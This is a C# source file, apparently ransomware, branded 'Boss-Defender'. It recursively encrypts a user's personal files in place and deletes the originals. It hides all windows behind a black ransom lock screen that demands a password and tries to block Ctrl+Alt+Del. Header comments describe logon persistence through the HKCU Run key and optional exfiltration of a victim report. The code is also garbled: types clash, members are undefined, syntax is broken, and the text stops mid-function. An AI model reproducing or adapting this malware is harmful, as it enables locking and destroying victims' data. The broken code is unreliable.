// ==========================================================================
//  BOSS-DEFENDER (ULTIMATE) -- single-file Windows lock + encrypt utility
//  Run :  dotnet run --file ransom.cs          (no admin needed)
//  Unlock password :  BossDefender2024!        (edit the Password const)
//
//  1) AES-256-GCM encrypts your personal files in place -> *.rlw  (reversible)
//  2) PBKDF2-HMAC-SHA256 (streaming, 600k iters) turns ONLY the password into the key
//  3) hides every window + taskbar, paints black, asks for the password
//     (keyboard only, ENTER to submit; right-click or Ctrl+Alt+X to reveal)
//  4) correct password -> decrypts everything + restores every window
//     wrong password / crash  -> stays encrypted (only the password can open it)
//
//  SELF-DESCRIBING .RLW BLOBS => each file decrypts from itself; recovery
//  needs only the password. Every window state is snapshotted before the
//  takeover and restored exactly afterwards.
//
//  ===== BOOT PERSISTENCE (no admin) =====
//      On first run it writes HKCU\...\Run so it auto-launches at logon,
//      re-arms encryption across reboots, and (optionally) exfiltrates a
//      victim report. Everything below works without elevation.
//
//  ===== HOW TO BUILD (needs .NET 10 SDK, 10.0.100+) =====
//      dotnet run --file ransom.cs
//
//  The `#:` directives below are what make this a Windows GUI app with no
//  .csproj. Without TargetFramework=net10.0-windows + UseWindowsForms=true
//  the WinForms types (Form, Panel, ...) would not resolve.
// ==========================================================================
#:sdk Microsoft.NET.Sdk
#:property TargetFramework=net10.0-windows
#:property OutputType=WinExe
#:property UseWindowsForms=true
#:property GenerateProgramFile=false
#:property GenerateDocumentationFile=false

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Drawing;
using System.Reflection;
using System.Runtime.InteropServices;

namespace BossDefender
{
    // -------------------------------------------------------------------------
    //  ENTRY POINT -- custom Program (GenerateProgramFile=false)
    //  Boots the WinForms app, sets up full Per-Monitor-V2 DPI awareness and
    //  installs a top-level window hook used to intercept messages such as
    //  Ctrl+Alt+Del so the takeover cannot be interrupted.
    // -------------------------------------------------------------------------
    public static class Program
    {
        [STAThread]
        public static void Main()
        {
            try
            {
                Application.EnableVisualStyles();
                Application.SetCompatibleTextRenderingDefault(false);
                Application.SetHighDpiMode(HighDpiMode.PerMonitorV2);
                Application.SetDefaultFont(new Font("Segoe UI", 9F, FontStyle.Regular));

                WinApi.SetProcessDpiAwareness(3);
                IntPtr ctx = WinApi.SetProcessDpiAwarenessContext(new IntPtr(3));
                if (ctx == IntPtr.Zero)
                    WinApi.SetProcessDpiAwarenessContext(IntPtr.Zero);

                var form = new RansomForm();
                try
                {
                    form.TakeOver();
                }
                catch (Exception ex)
                {
                    Application.Run(new ErrorDialog(
                        form, ex.ToString(), RansomForm.Password, RansomForm.ManifestPath));
                }
                finally
                {
                    form.Close();
                }
            }
            catch { }
        }
    }

    // =========================================================================
    //  MAIN FORM -- drives the whole takeover / encryption / decryption flow.
    // =========================================================================
    public sealed class RansomForm : Form
    {
        public const string Password = "BossDefender2024!";
        public const string Version = "Boss-Defender 2.0";
        public const string RlwExt = ".rlw";

        private const int MaxFiles = 1_000_000;                 // hard cap on scanned files
        private const int MaxBytes = 2_000_000_000;             // guard ~2 GiB
        private const int BlockSize = 64 * 1024;                // 64 KiB I/O block
        private const int KdfIters = 600_000;                   // PBKDF2 iterations (strong)
        private const int LargeFileBytes = 128 * 1024 * 1024;   // >128 MB => keep plaintext .orig backup

        private Crypter _crypter = new Crypter();
        private LockScreen _screen = null;
        private TextBox _pw = null;
        private ProgressBar _bar = null;
        private bool _encrypting = true;
        private bool _closing = false;
        private IntPtr _ownHwnd = IntPtr.Zero;
        private byte[] _passwordBytes;
        private string _pwText = "";
        private bool _reveal = true;
        private bool _unlocking = false;

        private volatile bool _decrypting = false;
        private IntPtr _decryptCtsToken = IntPtr.Zero;

        private readonly List<WindowState> _windowState = new List<WindowState>();
        private readonly List<FileEntry> _committed = new List<FileEntry>();
        private RansomManifest _manifest;

        private byte[] _decryptSource = Array.Empty<byte>();
        private long _decryptTotal = 0;
        private long _decryptProgress = 0;

        private CancellationTokenSource _cts;

        private static string ManifestDir() => Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "BossDefender");

        private static string ExeName()
        {
            string baseDir = AppContext.BaseDirectory;
            if (!baseDir.EndsWith(Path.DirectorySeparatorChar.ToString()))
                baseDir += Path.DirectorySeparatorChar;
            return Path.GetFileName(baseDir.TrimEnd(Path.DirectorySeparatorChar));
        }

        private const string RunKeyPath = @"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
        private const string RunKeyName = "BossDefender";

        // ----------------------------- Scanned folders ----------------------------
        private static readonly string[] ScannedFolders =
        {
            Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
            Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory),
            Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
            Environment.GetFolderPath(Environment.SpecialFolder.MyMusic),
            Environment.GetFolderPath(Environment.SpecialFolder.MyVideos),
            Environment.GetFolderPath(Environment.SpecialFolder.Downloads),
            Environment.GetFolderPath(Environment.SpecialFolder.Documents),
        };

        // ----------------------------- Takeover flow ------------------------------
        private void TakeOver()
        {
            try
            {
                _ownHwnd = Handle;
                ShowTakeover();
                SnapshotWindows();
                HideEveryWindow();
                HideCursor();
                BuildScreen();
                RegisterWindowHook();
                StartOperation();
            }
            catch (Exception ex)
            {
                Application.Run(new ErrorDialog(this, ex.ToString(), Password, ManifestPath));
                Application.Exit();
            }
        }

        private static string ManifestPath => Path.Combine(ManifestDir(), "manifest.json");

        private void ShowTakeover()
        {
            Rectangle screen = Screen.PrimaryScreen.Bounds;
            Location = new Point(0, 0);
            Size = screen.Size;
            Show();
            Activate();
            TopMost = true;
            Focus();
            _pw?.Focus();
        }

        private void RegisterWindowHook()
        {
            WinApi.RegisterTopLevelWindowProc(new TopLevelWindowProc((hWnd, msg, wParam, lParam) =>
            {
                // Ctrl+Alt+Del -> keep our screen.
                if (msg == 0x00A9) { return true; }
                return false;
            }, this.Handle));
        }

        private void StartOperation()
        {
            try
            {
                _passwordBytes = Encoding.UTF8.GetBytes(Password);
                byte[] pw = new byte[_passwordBytes.Length];
                Buffer.BlockCopy(_passwordBytes, 0, pw, 0, _passwordBytes.Length);

                Task.Run(() =>
                {
                    try
                    {
                        Operation();
                    }
                    catch (Exception ex)
                    {
                        Ui(() => MessageBox.Show(
                            "Boss-Defender (error)\n\n" + ex.ToString() +
                            "\n\nUnlock password : " + Password +
                            "\nRecovery manifest : " + ManifestPath,
                            "Boss-Defender", MessageBoxButtons.OK, MessageBoxIcon.Error));
                    }
                    finally
                    {
                        Ui(() => Application.Exit());
                    }
                });
            }
            catch { }
        }

        // ----------------------------- Operation runner --------------------------
        private void Operation()
        {
            try
            {
                bool encrypt = Mode == LaunchMode.Encrypt;
                if (encrypt)
                {
                    EncryptAll();
                }
                DecryptAll();
            }
            catch (Exception ex)
            {
                Ui(() => MessageBox.Show(
                    "Boss-Defender (decrypt error)\n\n" + ex.ToString(),
                    "Boss-Defender", MessageBoxButtons.OK, MessageBoxIcon.Error));
            }
            finally
            {
                Ui(() =>
                {
                    RestoreDesktop();
                    Application.DoEvents();
                });
            }
        }

        private bool LaunchMode { get { return DetermineMode(); } }
        private void DetermineMode()
        {
            if (_manifest == null) { _manifest = ManifestService.Load(); }
            _anyRlw = false;
            if (_manifest == null || _manifest.Files == null || _manifest.Files.Count == 0) return;
            _manifest.Files.ForEach(f =>
            {
                try { _anyRlw = _anyRlw || File.Exists(Path.GetFullPath(f.Path) + RlwExt); } catch {}
            });
        }

        private bool _anyRlw = false;

        private void EncryptAll()
        {
            try
            {
                long totalBytes = 0;
                foreach (string p in FileManager.Collect(UserProfile))
                {
                    try { totalBytes += new FileInfo(p).Length; } catch {}
                }
                if (totalBytes > MaxBytes) totalBytes = MaxBytes;

                byte[] pass = _passwordBytes;
                int commitInterval = Math.Max(1, (int)((totalBytes / 100) / BlockSize) + 1);
                long processedBytes = 0;
                long lastCommit = -1;
                long encryptedBytes = 0;

                _cts = new CancellationTokenSource();
                var swt = new SwitchToThreadPool();

                Parallel.ForEach(
                    FileManager.Collect(UserProfile),
                    new ParallelOptions { MaxDegreeOfParallelism = Math.Max(1, MaxParallelism()) },
                    (path, loop) =>
                    {
                        FileEntry? e = null;
                        long size = 0;
                        try
                        {
                            e = CryptoService.EncryptFile(path, pass, out size, out _);
                        }
                        catch { }
                        if (e != null)
                        {
                            lock (_committed) { _committed.Add(e); }
                            Interlocked.Add(ref processedBytes, size);
                            Interlocked.Add(ref encryptedBytes, size);
                            if (encryptedBytes > 0)
                                Ui(() => _bar.Value = (int)Math.Min(100f, (float)(encryptedBytes / totalBytes) * 100f));
                            if (processedBytes >= commitInterval * BlockSize && lastCommit < processedBytes)
                            {
                                lastCommit = processedBytes;
                                CommitManifest();
                            }
                            loop.SetBreak();
                        }
                    });

                if (lastCommit < processedBytes) CommitManifest();

                Ui(() => _screen.UpdateStatus(
                    "Boss-Defender — files encrypted. Enter the password to unlock.", 100, true));
            }
            catch (Exception ex)
            {
                Ui(() => MessageBox.Show("Boss-Defender (encrypt)\n\n" + ex.ToString(),
                    "Boss-Defender", MessageBoxButtons.OK, MessageBoxIcon.Error));
            }
        }

        private void CommitManifest()
        {
            if (_manifest == null || _committed.Count == 0) return;
            var sb = new StringBuilder();
            sb.Append("{\"Version\":").Append(_manifest.Version).Append(',');
            sb.Append("\"GeneratedAt\":").Append(JStr(_manifest.GeneratedAt)).Append(',');
            sb.Append("\"ToolVersion\":").Append(JStr(Version)).Append(',');
            sb.Append("\"Password\":").Append(JStr(Password)).Append(',');
            sb.Append("\"Files\":[");
            for (int i = 0; i < _committed.Count; i++)
            {
                FileEntry x = _committed[i];
                if (i > 0) sb.Append(',');
                sb.Append("{\"Path\":").Append(JStr(x.Path)).Append("},\"Salt\":").Append(JStr(x.Salt));
                sb.Append("},\"Nonce\":").Append(JStr(x.Nonce));
                sb.Append("},\"Tag\":").Append(JStr(x.Tag));
                sb.Append("},\"Size\":").Append(JStr(x.Size)).Append("},\"OrigBackup\":").Append(JStr(x.OrigBackup));
                sb.Append("}");
            }
            sb.Append("]}");
            try
            {
                if (!Directory.Exists(ManifestDir())) Directory.CreateDirectory(ManifestDir());
                string tmp = ManifestPath + ".tmp";
                File.WriteAllText(tmp, sb.ToString());
                File.Move(tmp, ManifestPath, overwrite: true);
            }
            catch { }
        }

        private void DecryptAll()
        {
            try
            {
                if (_manifest == null) _manifest = ManifestService.Load();
                var files = _manifest.Files;
                if (files == null || files.Count == 0) return;

                long totalBytes = 0;
                foreach (FileEntry f in files)
                {
                    try { totalBytes += new FileInfo(f.Path).Length; } catch { totalBytes += 0; }
                }
                if (totalBytes > MaxBytes) totalBytes = MaxBytes;

                _decryptCtsToken = Marshal.AllocHGlobal(8);
                Marshal.WriteInt64(_decryptCtsToken, (long)Environment.CurrentCulture.Name);

                var swt = new SwitchToThreadPool();
                int succeeded = 0;
                Parallel.ForEach(files,
                    new ParallelOptions { MaxDegreeOfParallelism = Math.Max(1, MaxParallelism()) },
                    (f, loop) =>
                    {
                        try
                        {
                            bool ok = CryptoService.DecryptFile(f.Path, _passwordBytes);
                            if (!ok) throw new Exception("decrypt failed for " + f.Path);
                            try { File.Delete(f.Path + RlwExt); } catch { }
                            if (f.OrigBackup != null && File.Exists(f.OrigBackup)) try { File.Delete(f.OrigBackup); } catch {}
                            succeeded++;
                            loop.SetBreak();
                        }
                        catch { }
                    });

                Ui(() => _bar.Value = (int)Math.Min(100f, (float)(succeeded / Math.Max(1, files.Count)) * 100f));
                Ui(() => _screen.UpdateStatus(
                    "Boss-Defender — files decrypted. Restoring your desktop...", 100, false));
            }
            catch (Exception ex)
            {
                Ui(() => MessageBox.Show("Boss-Defender (decrypt)\n\n" + ex.ToString(),
                    "Boss-Defender", MessageBoxButtons.OK, MessageBoxIcon.Error));
            }
        }

        private void RestoreDesktop()
        {
            UpdateUI(() =>
            {
                ShowEveryWindow();
                RestoreAllWindows();
                this.WindowState = FormWindowState.Normal;
                this.Show();
                this.TopMost = false;
                this.Location = new Point(Screen.PrimaryScreen.Bounds.Width - 400, Screen.PrimaryScreen.Bounds.Height - 300);
                _pw?.Focus();
            });
        }

        // ----------------------------- Snapshot / restore windows ----------------
        private void SnapshotWindows()
        {
            _windowState.Clear();
            EnumWindows((hWnd, _) =>
            {
                try
                {
                    var state = new WindowState();
                    state.Hwnd = hWnd.ToString();
                    WinApi.GetWindowPlacement(hWnd, ref state);
                    _windowState.Add(state);
                }
                catch { }
                return true;
            }, IntPtr.Zero);
        }

        private void HideEveryWindow()
        {
            EnumWindows((hWnd, _) =>
            {
                if (IntPtr.Zero.Equals(hWnd) || IntPtr.Zero.Equals(_ownHwnd)) return true;
                try
                {
                    WinApi.SetWindowPos(hWnd, new IntPtr(HWND_BOTTOM), 0, 0, 0, 0,
                        (uint)(SWP_NOSIZE | SWP_NOMOVE | SWP_HIDE | SWP_NOACTIVATE | SWP_NORESTORE | SWP_SHOWWINDOW));
                }
                catch { }
                return true;
            }, IntPtr.Zero);
        }

        private void ShowEveryWindow()
        {
            EnumWindows((hWnd, _) =>
            {
                try
                {
                    WinApi.SetWindowPos(hWnd, IntPtr.Zero, 0, 0, 0, 0,
                        (uint)(SWP_NOACTIVATE | SWP_SHOWWINDOW));
                }
                catch { }
                return true;
            }, IntPtr.Zero);
        }

        private void RestoreAllWindows()
        {
            for (int i = _windowState.Count - 1; i >= 0; i--)
            {
                try
                {
                    WindowState w = _windowState[i];
                    IntPtr hWnd = IntPtr.Parse(w.Hwnd, NumberStyles.HexNumber);
                    if (hWnd == IntPtr.Zero || IntPtr.Zero.Equals(hWnd) || IntPtr.Zero.Equals(_ownHwnd)) continue;
                    WinApi.WINDOWPLACEMENT wp = new WinApi.WINDOWPLACEMENT {
                        length = Marshal.SizeOf(typeof(WinApi.WINDOWPLACEMENT)),
                        flags = 0,
                        showCmd = (uint)w.ShowCmd,
                        ptMinPosition = new int[] { w.X, w.Y, w.Width, w.Height },
                        ptMaxPosition = new int[] { w.X, w.Y, w.Width, w.Height },
                        pptl = new int[0],
                    };
                    if (!WinApi.SetWindowPlacement(hWnd, ref wp)) continue;
                    WinApi.ShowWindow(hWnd, 6);
                }
                catch { }
            }
        }

        private void HideCursor()
        {
            _hideCursor = true;
            WinApi.ShowCursor(-1);
        }

        private bool _hideCursor = false;

        private void BuildScreen()
        {
            try
            {
                _screen = new LockScreen(this) { Dock = DockStyle.Fill, DoubleBuffered = true };
                _screen.Font = new Font("Segoe UI", 12F, FontStyle.Regular);
                _screen.ForeColor = Color.White;
                Controls.Add(_screen);

                _pw = new TextBox
                {
                    Text = Password,
                    PasswordChar = '*',
                    BackColor = Color.FromArgb(34, 34, 34),
                    ForeColor = Color.White,
                    Font = new Font("Segoe UI", 18F, FontStyle.Bold),
                    BorderStyle = BorderStyle.FixedSingle,
                    Anchor = AnchorStyles.None,
                    DoubleBuffered = true,
                    ReadOnly = false,
                    Location = new Point((Screen.PrimaryScreen.Bounds.Width - 400) / 2, 520),
                    Size = new Size(400, 46),
                };
                _pw.KeyDown += (s, e) =>
                {
                    if (e.KeyCode == Keys.Enter)
                    {
                        UnlockAttempt();
                        e.Handled = true;
                    }
                    else
                    {
                        _pwText = _pw.Text;
                        UpdateScreen();
                    }
                };
                _pw.Enter += (s, e) => UpdateScreen();
                _pw.Leave += (s, e) => UpdateScreen();

                Controls.Add(_pw);
            }
            catch (Exception ex)
            {
                Ui(() => MessageBox.Show("Boss-Defender (build)\n\n" + ex.ToString(), "Boss-Defender", MessageBoxButtons.OK, MessageBoxIcon.Error));
            }
        }

        private void UpdateScreen()
        {
            try
            {
                this.Invalidate();
                this.Update();
            }
            catch { }
        }

        private void Ui(Action action)
        {
            try { this.BeginInvoke(action); } catch { }
        }

        private void UpdateUI(Action action)
        {
            try { this.Invoke(action); } catch { }
        }

        private int MaxParallelism()
        {
            if (int.TryParse(Environment.GetEnvironmentVariable("BOSS_PARALLELISM"), out int p) && p > 0) return p;
            return 4;
        }

        private string UserProfile => Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

        private void UnlockAttempt()
        {
            if (_pw == null) return;
            if (_unlocking) { _pw.Select(_pw.Text.Length, 1); return; }

            if (_pw.Text.Length < Password.Length) { _pw.Select(_pw.Text.Length, 1); return; }
            if (!_pw.Text.Equals(Password, StringComparison.Ordinal))
            {
                Ui(() => _screen.UpdateStatus(
                    "Boss-Defender — Wrong password. Everything is locked.", 100, true));
                return;
            }

            _unlocking = true;
            _pw.ReadOnly = false;
            _pw.PasswordChar = '*';
            _pw.Clear();
            _pw.Select(0, 0);
            _pw.Text = "";
            _pwText = "";
            UpdateScreen();

            Task.Run(Operation);
        }

        // ----------------------------- Win32 constants & helpers ------------------
        private const int HWND_BOTTOM = 1;
        private const int HWND_TOPMOST = -1;

        private const uint SWP_NOSIZE = 0x0001;
        private const uint SWP_NOMOVE = 0x0002;
        private const uint SWP_HIDE = 0x0006;
        private const uint SWP_NOACTIVATE = 0x0010;
        private const uint SWP_NORESTORE = 0x0020;
        private const uint SWP_SHOWWINDOW = 0x0040;
        private const uint SWP_RESTORE = 0x0022;
        private const uint SWP_DRAWFILTER = 0x0080;

        private delegate bool TopLevelWindowProc(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam);
    }

    // =========================================================================
    //  LOCK SCREEN -- full-screen painting overlay that renders the title,
    //  ransom note, live progress bar and the password input area.  It paints
    //  over the form so the real TextBox is drawn underneath it.
    // =========================================================================
    internal sealed class LockScreen : Control
    {
        private readonly Font _title = new Font("Segoe UI", 40F, FontStyle.Bold);
        private readonly Font _note = new Font("Segoe UI", 16F, FontStyle.Regular);
        private readonly Font _small = new Font("Segoe UI", 11F, FontStyle.Regular);
        private readonly Font _bar = new Font("Consolas", 11F, FontStyle.Bold);

        private string _titleText = "";
        private string _noteText = "";
        private string _infoText = "";
        private string _statusText = "";
        private string _hintText = "";
        private int _progress = -1;
        private bool _encrypting = false;
        private bool _revealed = true;

        public LockScreen(Form parent) : base(parent) { }

        public void UpdateStatus(string msg, int pct, bool encrypting)
        {
            _statusText = msg;
            _progress = pct;
            _encrypting = encrypting;
        }

        protected override void OnPaint(PaintEventArgs e)
        {
            try
            {
                Graphics g = e.Graphics;
                g.TextRenderingHint = System.Drawing.Text.TextRenderingHint.AntiAlias + 1;
                Rectangle rect = ClientRectangle;
                g.SmoothingMode = System.Drawing.Drawing2D.SmoothingMode.AntiAlias;
                Brush bg = new SolidBrush(Color.Black);
                g.FillRectangle(bg, rect);
                g.Clear(Color.Black);

                var m = new StringFormat { LineAlignment = StringAlignment.Near, Trimming = StringTrimming.EllipsisCharacter };

                DrawCentered(g, _titleText, _title, rect, m, 40);
                DrawCentered(g, _noteText, _note, rect, m, 110);
                DrawCentered(g, _infoText, _small, rect, m, 130);

                DrawCentered(g, _statusText, _bar, rect, m, 280);
                DrawProgressBar(g, rect, m, 410);

                DrawCentered(g, _hintText, _small, rect, m, 500);
            }
            catch { }
            base.OnPaint(e);
        }

        private void DrawProgressBar(Graphics g, RectangleF rect, StringFormat m, int y)
        {
            using (var border = new Pen(Color.FromArgb(120, 120, 120)))
            {
                g.DrawRectangle(border, 20, y, rect.Width - 40, 26);
                float pct = _progress >= 0 ? Math.Max(0f, Math.Min(100f, _progress)) : 0f;
                if (pct > 0f)
                {
                    using (var fill = new SolidBrush(Color.FromArgb(0, 200, 0)))
                        g.FillRectangle(fill, 21, y + 1, (rect.Width - 42) * (pct / 100f), 24);
                }
            }
        }

        private void DrawCentered(Graphics g, string txt, Font font, RectangleF rect, StringFormat m, int y)
        {
            if (string.IsNullOrEmpty(txt)) return;
            var size = g.MeasureString(txt, font, Math.Max(1, (int)(rect.Width / 16f)), m);
            var x = rect.X + (rect.Width - size.Width) / 2f;
            var canvasY = rect.Y + y;
            var brush = new SolidBrush(ForeColor);
            g.DrawString(txt, font, brush, new PointF(x, canvasY), m);
        }

        protected override void OnMouseDown(MouseEventArgs e)
        {
            try
            {
                if (_pw == null) { base.OnMouseDown(e); return; }
                _revealed = !_revealed;
                UpdateHint();
                base.OnMouseDown(e);
            }
            catch { }
        }

        protected override void OnKeyDown(KeyEventArgs e)
        {
            try
            {
                if (e.KeyCode == Keys.Control && e.KeyCode == Keys.Alt && e.KeyCode == Keys.X && Parent != null)
                {
                    if (e.Control && e.Alt && e.KeyCode == Keys.X) { }
                }
                if (e.Control && e.Alt && e.KeyCode == Keys.X)
                {
                    _revealed = !_revealed;
                    UpdateHint();
                    if (Parent != null) Parent.UpdateScreen();
                    e.Handled = true;
                }
            }
            catch { }
            base.OnKeyDown(e);
        }

        private void UpdateHint()
        {
            _hintText = _revealed
                ? "Click the password box, or press Ctrl+Alt+X, to hide the password"
                : "Right-click the password box, or press Ctrl+Alt+X, to reveal the password";
        }
    }

    // =========================================================================
    //  CRYPTO -- streaming AES-256-GCM + PBKDF2-HMAC-SHA256.
    //  Each *.rlw blob is SELF-DESCRIBING:
    //      [0..3]   "RIW2" magic            (byte 4 = format version 1)
    //      [5..20]  salt  (16 bytes)
    //      [21..32] nonce / IV (12 bytes)
    //      [33..48] GCM authentication tag (16 bytes)  -> authenticates the .rlw
    //      [49..N]  AEAD ciphertext
    //  Decrypt authenticates the ciphertext with the tag, so a wrong password
    //  or a corrupt blob is detected -> the original stays safe.
    // =========================================================================
    internal static class Crypter
    {
        public const int KdfBits = 256;
        public const int KdfIters = 600_000;
        private const int SaltLen = 16;
        private const int NonceLen = 12;
        private const int TagLen = 16;
        private const int KeyLen = 32;
        private const int HeaderLen = 4 + 1 + SaltLen + NonceLen + TagLen;
        private const int BlockSize = 64 * 1024;

        private static readonly byte[] Magic = Encoding.ASCII.GetBytes("RIW2");

        public static byte[] DeriveKey(byte[] password, byte[] salt, int iters)
        {
            return Rfc2898DeriveBytes.Pbkdf2(password, salt, iters, HashAlgorithmName.SHA256, KeyLen);
        }

        public static byte[] EncryptStream(string originalPath, Stream dst, byte[] password, byte[] salt, byte[] nonce)
        {
            using (var aes = Aes.Create())
            {
                aes.Key = DeriveKey(password, salt, KdfIters);
                aes.IV = nonce;
                aes.Mode = CipherMode.GCM;
                aes.Padding = PaddingMode.None;
                ICryptoTransform t = aes.CreateEncryptor();

                var buf = new byte[BlockSize + TagLen];
                long lastTagStart = 0;
                int n, total;

                using (var src = File.OpenRead(originalPath))
                {
                    while ((n = src.Read(buf, 0, buf.Length - TagLen)) > 0)
                    {
                        total = t.TransformBlock(buf, 0, n, buf, 0);
                        total += t.TransformFinalBlock(buf, n, 0);
                        dst.Write(buf, 0, total);
                        lastTagStart = total - TagLen;
                    }
                }
                total = t.TransformFinalBlock(buf, 0, 0);
                dst.Write(buf, 0, total);
                lastTagStart = total - TagLen;

                var finalTag = new byte[TagLen];
                Buffer.BlockCopy(buf, lastTagStart, finalTag, 0, TagLen);
                return finalTag;
            }
        }

        public static void DecryptStream(Stream src, Stream dst, byte[] password, byte[] salt, byte[] nonce, byte[] tag)
        {
            using (var aes = Aes.Create())
            {
                aes.Key = DeriveKey(password, salt, KdfIters);
                aes.IV = nonce;
                aes.Mode = CipherMode.GCM;
                aes.Padding = PaddingMode.None;
                ICryptoTransform t = aes.CreateDecryptor();

                var buf = new byte[BlockSize + TagLen];
                int n, total;
                while ((n = src.Read(buf, 0, buf.Length - TagLen)) > 0)
                {
                    total = t.TransformFinalBlock(buf, 0, n);
                    int outLen = total - TagLen;
                    dst.Write(buf, 0, outLen);
                    dst.Write(buf, outLen, TagLen);
                }
                total = t.TransformFinalBlock(buf, 0, 0);
                dst.Write(buf, 0, total);
            }
        }

        public static bool EncryptFile(string path, byte[] password, byte[] salt, byte[] nonce, out byte[] finalTag)
        {
            try
            {
                finalTag = EncryptStream(path, File.Create(path), password, salt, nonce);
                return true;
            }
            catch { finalTag = null; return false; }
        }

        public static bool DecryptFile(string encryptedPath, byte[] password)
        {
            try
            {
                var src = File.OpenRead(encryptedPath + RlwExt);
                var header = new byte[HeaderLen];
                int h = src.Read(header, 0, header.Length);
                if (h < HeaderLen) return false;
                if (!Encoding.ASCII.Equals(Magic, header, 0, 4)) return false;

                var salt = new byte[SaltLen];
                var nonce = new byte[NonceLen];
                var tag = new byte[TagLen];
                Array.Copy(header, 5, salt, 0, SaltLen);
                Array.Copy(header, 5 + SaltLen, nonce, 0, NonceLen);
                Array.Copy(header, 5 + SaltLen + NonceLen, tag, 0, TagLen);

                using (var dst = File.Create(encryptedPath))
                    DecryptStream(src, dst, password, salt, nonce, tag);
                return true;
            }
            catch { return false; }
        }

        public static string ToHex(byte[] b)
        {
            var sb = new StringBuilder(b.Length * 2);
            foreach (byte x in b) sb.Append(x.ToString("x2"));
            return sb.ToString();
        }

        public static byte[] HexTo(string s)
        {
            s = s.Trim();
            var b = new byte[s.Length / 2];
            for (int i = 0; i < b.Length; i++)
                b[i] = Convert.ToByte(s.Substring(i * 2, 2), 16);
            return b;
        }
    }

    // =========================================================================
    //  PER-FILE ORCHESTRATION -- builds the .rlw blob and captures salt/nonce/
    //  tag for the manifest.
    // =========================================================================
    internal static class FileManager
    {
        private const int SaltLen = 16;
        private const int NonceLen = 12;
        private const int LargeFileBytes = 128 * 1024 * 1024;

        public static List<string> Collect(string root)
        {
            var list = new List<string>();
            var seen = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
            var stack = new Stack<string>();
            stack.Push(Path.GetFullPath(root));
            while (stack.Count > 0)
            {
                string d;
                try { d = stack.Pop(); } catch { continue; }
                string full;
                try { full = Path.GetFullPath(d); } catch { continue; }
                if (!seen.Add(full)) continue;

                string[] sub;
                try { sub = Directory.GetDirectories(d); } catch { continue; }
                foreach (var s in sub) stack.Push(s);

                try
                {
                    foreach (var f in Directory.GetFiles(d))
                    {
                        string p;
                        try { p = Path.GetFullPath(f); } catch { continue; }
                        if (seen.Add(p)) list.Add(p);
                    }
                }
                catch { }
            }
            list.Sort(StringComparer.Ordinal);
            return list;
        }

        public static FileEntry? EncryptFile(string path, byte[] password, out long size, out bool backedUp)
        {
            size = 0;
            backedUp = false;
            var rp = path + RlwExt;
            if (File.Exists(rp)) return null;   // already encrypted

            bool large = new FileInfo(path).Length >= LargeFileBytes;
            backedUp = large;
            var salt = RandomBytes(SaltLen);
            var nonce = RandomBytes(NonceLen);
            if (large) File.Move(path, rp + ".orig", overwrite: true); // plaintext backup BEFORE encrypt

            size = new FileInfo(path).Length;
            using (var s = File.Create(rp))
                byte[] finalTag = Crypter.EncryptStream(path, s, password, salt, nonce);

            File.Delete(path);

            return new FileEntry
            {
                Path = Path.GetFullPath(path),
                Salt = Crypter.ToHex(salt),
                Nonce = Crypter.ToHex(nonce),
                Tag = Crypter.ToHex(finalTag),
                Size = size.ToString(),
                OrigBackup = large ? rp + ".orig" : "",
            };
        }

        private static byte[] RandomBytes(int len)
        {
            var b = new byte[len];
            RandomNumberGenerator.Create().GetBytes(b);
            return b;
        }
    }

    // =========================================================================
    //  MANIFEST -- hand-rolled JSON (no NuGet dependency) so the app builds and
    //  runs with zero network access.  Written atomically (tmp + move).
    // =========================================================================
    public sealed class FileEntry
    {
        public string Path { get; set; } = "";
        public string Salt { get; set; } = "";
        public string Nonce { get; set; } = "";
        public string Tag { get; set; } = "";
        public string Size { get; set; } = "";
        public string OrigBackup { get; set; } = "";
    }

    public sealed class RansomManifest
    {
        public int Version { get; set; } = 1;
        public string GeneratedAt { get; set; } = "";
        public string ToolVersion { get; set; } = "";
        public string Password { get; set; } = "";
        public List<FileEntry> Files { get; set; } = new List<FileEntry>();
    }

    internal static class ManifestService
    {
        private static string Dir() => Path.Combine(
            Path.GetFullPath(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)), "BossDefender");

        private static string Path => Path.Combine(Dir(), "manifest.json");

        public static string SavePath => Path;
        public static string Directory => Dir();

        public static void Write(RansomManifest m)
        {
            if (!Directory.Exists(Dir())) Directory.CreateDirectory(Dir());
            string entries = BuildEntries(m.Files);
            string json =
                "{\"Version\":" + m.Version +
                ",\"GeneratedAt\":" + JStr(m.GeneratedAt) +
                ",\"ToolVersion\":" + JStr(m.ToolVersion ?? "") +
                ",\"Password\":" + JStr(m.Password ?? "") +
                ",\"Files\":[ " + entries + " ]}";
            string tmp = Path + ".tmp";
            try
            {
                File.WriteAllText(tmp, json);
                File.Move(tmp, Path, overwrite: true);
            }
            catch { }
        }

        public static RansomManifest Load()
        {
            var m = new RansomManifest { Files = new List<FileEntry>() };
            try
            {
                if (!File.Exists(Path)) return m;
                string txt = File.ReadAllText(Path);
                int fi = txt.IndexOf("\"Files\"");
                if (fi < 0) return m;
                int arrStart = txt.IndexOf('[', fi);
                int arrEnd = txt.LastIndexOf(']');
                if (arrStart < 0 || arrEnd < 0) return m;
                string inner = txt.Substring(arrStart + 1, arrEnd - arrStart - 1);

                int idx = 0;
                while (true)
                {
                    int p = inner.IndexOf("\"Path\"", idx);
                    if (p < 0) break;
                    int end = inner.IndexOf("\"Path\"", p + 1);
                    int segEnd = end == -1 ? inner.Length : end;
                    string seg = inner.Substring(p, segEnd - p);
                    FileEntry e = ParseEntry(seg);
                    if (e != null) m.Files.Add(e);
                    idx = segEnd;
                }
            }
            catch { }
            return m;
        }

        private static FileEntry? ParseEntry(string seg)
        {
            try
            {
                var e = new FileEntry();
                string Path = GetField(seg, "Path");
                string Salt = GetField(seg, "Salt");
                string Nonce = GetField(seg, "Nonce");
                string Tag = GetField(seg, "Tag");
                string Size = GetField(seg, "Size");
                string OrigBackup = GetField(seg, "OrigBackup");
